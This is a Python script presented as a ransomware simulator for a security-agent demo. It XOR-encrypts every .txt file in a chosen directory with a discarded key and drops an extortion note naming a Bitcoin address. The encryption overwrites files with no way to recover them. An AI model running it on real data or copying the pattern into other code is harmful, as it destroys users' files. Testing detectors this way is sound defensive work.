#!/usr/bin/env python3
"""
Ransomware Simulator for KubeHeal Demo.
Simulates ransomware behavior for testing the Security Agent.
"""

import os
import sys
import time
import random
import subprocess
import signal
from pathlib import Path

DATA_DIR = "/data"
ENTROPY_THRESHOLD = 7.0
ENCRYPTION_BLOCK_SIZE = 4096


class RansomwareSimulator:
    """Simulates ransomware encryption behavior."""
    
    def __init__(self, data_dir: str = DATA_DIR):
        self.data_dir = Path(data_dir)
        self.encrypted_files = []
        self.running = False
        
    def create_test_files(self, num_files: int = 100) -> None:
        """Create test files to encrypt."""
        self.data_dir.mkdir(parents=True, exist_ok=True)
        
        print(f"Creating {num_files} test files...")
        
        for i in range(num_files):
            file_path = self.data_dir / f"file_{i:04d}.txt"
            
            content = "X" * random.randint(100, 1000)
            
            file_path.write_text(content)
        
        print(f"Created {num_files} files")
    
    def encrypt_file(self, file_path: Path) -> bytes:
        """Encrypt a single file with XOR (simplified AES-like behavior)."""
        try:
            data = file_path.read_bytes()
            
            key = os.urandom(1)[0] or 0x42
            
            encrypted = bytes([b ^ key for b in data])
            
            return encrypted
        except Exception as e:
            print(f"Error encrypting {file_path}: {e}")
            return b""
    
    def encrypt_files(self, rate: int = 180) -> int:
        """Encrypt files at specified rate (files per second)."""
        files = list(self.data_dir.glob("*.txt"))
        
        encrypted_count = 0
        
        delay = 1.0 / rate if rate > 0 else 0.1
        
        for file_path in files[:rate]:
            encrypted_data = self.encrypt_file(file_path)
            
            if encrypted_data:
                file_path.write_bytes(encrypted_data)
                
                self.encrypted_files.append(str(file_path))
                encrypted_count += 1
            
            time.sleep(delay)
        
        return encrypted_count
    
    def create_ransom_note(self) -> None:
        """Create ransom note file."""
        note_path = self.data_dir / "DECRYPT_FILES.txt"
        note_content = """\
IMPORTANT NOTICE!
==============

All your files have been encrypted!

To recover your files, send 0.5 BTC to:
bc1qxy89kgwqrldqqqqqqp5v3a6l9a5u7q7q8u6a5l

Contact: attacker@onion.mail

Your files will be deleted in 72 hours!

DECRYPT FILES.txt
"""
        note_path.write_text(note_content)
        
        print(f"Created ransom note: {note_path}")
    
    def simulate_attack(self, duration: int = 60, rate: int = 180) -> None:
        """Simulate a full ransomware attack."""
        self.running = True
        self.create_test_files()
        
        print(f"Starting ransomware simulation...")
        print(f"Files will be encrypted at {rate} files/second")
        
        start_time = time.time()
        
        while self.running and time.time() - start_time < duration:
            encrypted = self.encrypt_files(rate)
            
            print(f"Encrypted {encrypted} files (total: {len(self.encrypted_files)})")
            
            if not self.running:
                break
                
            time.sleep(1)
        
        if self.running:
            self.create_ransom_note()
        
        print(f"Attack simulation complete!")
        print(f"Total files encrypted: {len(self.encrypted_files)}")
    
    def stop(self) -> None:
        """Stop the simulation."""
        self.running = False
        print("Stopping simulation...")


def install_entropy_tools() -> None:
    """Check/install entropy calculation tools."""
    try:
        subprocess.run(["which", "ent"], check=False, capture_output=True)
    except:
        print("Note: Install 'ent' tool for entropy testing")


def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Ransomware Simulator for KubeHeal Demo")
    parser.add_argument("--data-dir", type=str, default=DATA_DIR, help="Data directory")
    parser.add_argument("--num-files", type=int, default=100, help="Number of files to create")
    parser.add_argument("--rate", type=int, default=180, help="Encryption rate (files/sec)")
    parser.add_argument("--duration", type=int, default=60, help="Attack duration (seconds)")
    parser.add_argument("--continuous", action="store_true", help="Run continuously")
    
    args = parser.parse_args()
    
    sim = RansomwareSimulator(args.data_dir)
    
    def signal_handler(sig, frame):
        print("\nReceived interrupt, stopping...")
        sim.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    if args.continuous:
        print("Running continuous ransomware simulation...")
        while True:
            sim.create_test_files(args.num_files)
            sim.encrypt_files(args.rate)
            time.sleep(1)
    else:
        sim.simulate_attack(args.duration, args.rate)


if __name__ == "__main__":
    main()